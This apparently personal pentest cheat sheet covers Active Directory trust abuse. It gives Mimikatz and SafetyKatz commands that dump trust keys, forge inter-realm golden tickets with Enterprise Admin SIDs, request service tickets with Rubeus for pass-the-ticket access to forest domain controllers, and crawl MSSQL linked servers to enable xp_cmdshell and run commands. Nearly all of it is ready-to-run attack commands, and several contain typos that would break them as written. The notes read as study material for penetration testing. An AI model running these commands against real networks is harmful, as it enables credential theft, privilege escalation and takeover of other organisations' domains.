# AD - Trust Abuse - Cross-Forest Attacks / MSSQL

## Child to Parent using Trust Tickets

### Description

* sIDHistory is a user attribute designed for scenarios where a user is moved from one domain to another. When a user's domain is changed, they get a new SID and the old SID is added to sIDHistory.
* sIDHistory can be abused in two ways of escalating privileges within a forest: \
  – krbtgt hash of the child \
  – Trust tickets

<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

**Requirements**

* DA
* SafetyKatz.exe on DC

**Tool**

**Export Trustkey**

```powershell
SafetyKatz on DC
lsadump ::trust /patch'

Domain: dom.local (dom/ S-1-5-2...) 
[ In ] sub.dom.lcao -> dom.local
 => Take rc4_hmac_nt  ....

Invoke-Mimikatz -Command '"lsadump ::trust /patch'" -ComputerName dchostname
or
Invoke-Mimikatz -Command '"lsadump ::dcsync /user:dom\forest-dc-host$'"
or
Invoke-Mimikatz -Command '"lsadump ::lsa /patch'"
```

**Forge an inter-realm TGT**

{% code overflow="wrap" %}
```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberros::golden /user:Administrator /domain:sub.dom.local /sid:sid-of-current-domain /sids:sid-of-enterprise-admins-group-of-parent-domain /rc4:hash-of-trust-key-see-above-cmd /service:krbtgt /target:dom.local /ticket:C:\save-ticket-here.kirbi" "exit"

Invoke-mimikatz -command '"kerberros::golden /user:Administrator /domain:sub.dom.local /sid:sid-of-current-domain /sids:sid-of-enterprise-admins-group-of-parent-domain /rc4:hash-of-trust--key /service:krbtgt /target:dom.local /ticket:C:\save-ticket-here.kirbi'"
```
{% endcode %}

**Get a TGS for a Service in target domain with the new ticket / then use TGS co access targeted service**

{% code overflow="wrap" %}
```
rubeus.exe asktgs /ticket:C:\save-ticket-here.kirbi /service:cifs/forest-dc-hostname.dom.local dc:forest-dc-hostname.dom.local /ptt
dir \\forest-dc-hostname.dom.local\c$

.\asktgs.exe C:\save-ticket-here.kirbi CIFS/forest-dc-hostname.dom.local
.\kirbikator.exe lsa .\CIFS/forest-dc-hostname.dom.local
ls \\forest-dc-hostname.dom.local\c$

```
{% endcode %}



## Bidirectional Forest Trust

### Description

<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

If the receiving DC on the other forest can decrypt the received TGT from Step 5, with the trust key, it assumes everything within the TGT is correct and response with a TGS.\
The trustkey is the NTLM hash of the external domain saved on our DC.\
If we have access to the trustkey

We get in the end the permissions that our DA has been given in the forest domain.

### Tool

**We require the trust key for the inter-forest trust.**

```powershell
Invoke-Mimikatz -command '"lsadump::trust /patch"'
or
Invoke-Mimikatz -command '"lsadump::lsa /patch"'
```

Inter-Forest TGT can be forged with the NTLM hash of the trust key (name of the other forest)

{% code overflow="wrap" %}
```powershell
Invoke-Mimikatz -command '"Kerberos::golden /user:Administrator /domain dom.local /sid:SID /rc4:rc4ntlm /service:krbtgt /target:targetdom.lol /ticket:C:\myticket.kirbi

.\asktgs.exe C:\myticket.kirbi CIFS/foresttrust.dom.local

.\kirbikator.exe lsa .\CIFS/foresttrust.dom.local.kirbi

Now explicitly shares can be accessed - C$ on forest DC not
```
{% endcode %}

External Trust keys, don't automatically get renewed

Lookup:\
SIDHistory Attack for Parent-Child Domain\
SID Filtering is active for External and Forest Trusts.

## MSSQL Server - Data

### Description

* SQL Servers provide very good options for laterla movement as domain users can be mapped to databse roles
* Database Links allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources
* In case of databse Links between SQL Servers => linked SQL Servers - it is possible to execute stored procedures
* Database links work even accros forest trusts

### Requirement

* SPN and active SQL Server
* Executing Commands: Target server should have xp\_cmdshell or rpcout (disabled by default)
  * If rpcout is enalbed, you can enable xp\_cmdshell using\
    EXECUTE('sp\_configure "xp\_cmdshell",1;reconfigure;') AT "link-name"

### Tool

* PowerUpSQL [https://github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

**Discovery (SPN Scanning)**

```powershell
Get-SQLInstanceDomain

//Gets all SPNs which start with MSSQL - maybe no SQL Server is running (anymore)
```

**Check Accessibility**

```powershell
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose
```

**Gather Informatione**

```powershell
Get-SqlInstnaceDomain | Get-SQLServerInfor -verbose
```

**Search for database Links**

```powershell
Get-SQLServerLink -Instnace hostname_of_mssql_server -verbose
Get-SQLServerLinkCrawl -Instnace hostname_of_mssql_server -verbose

-or-

select * from master..sysservers 
//do it in HeidiSQL Portable / Hostname of mssqlserver & Windows Auth
```

**Enumerating DB Links manually**

{% code overflow="wrap" %}
```sql
select * from openquery("nextHost",'select * from master.sysservers')
select * from openquery(""nextHost",'select * from openquery("nexNextHost","select * from master.sysservers")')
```
{% endcode %}

**Executing commands**

{% code overflow="wrap" %}
```powershell
Get-SQLServerLinkCrawl -instance mssqlhostname -query "exec master..xp_cmdshell 'whoami'"
//this runs accross all links
```
{% endcode %}

